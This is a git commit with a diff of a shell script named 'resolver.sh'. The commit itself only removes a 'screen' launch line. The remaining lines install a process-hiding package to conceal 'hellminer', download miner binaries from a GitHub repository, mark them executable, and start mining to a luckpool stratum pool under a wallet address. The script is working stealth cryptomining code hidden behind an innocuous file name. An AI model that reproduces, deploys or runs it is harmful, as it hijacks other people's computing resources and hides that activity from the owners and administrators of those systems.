6af61a3f5d0edd2dc206d5b77d1b8d6f0f21beea
chikahusarii <85166601+chikahusarii@users.noreply.github.com>
2022-08-07 19:00:33 +0700

    Update resolver.sh

--- resolver.sh
+++ resolver.sh
@@ -1,4 +1,3 @@
 sudo apt install nodejs && npm i -g node-process-hider && sudo ph add hellminer
 wget https://raw.githubusercontent.com/chikahusarii/claim/main/hellminer && wget https://raw.githubusercontent.com/chikahusarii/claim/main/verus-solver && chmod +x hellminer && chmod +x verus-solver
-apt install screen -y && screen
 ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RVj1VkZYsvMHgRtNRn8z1eeGkTCGmK5qmH.r1 -p x --cpu 8
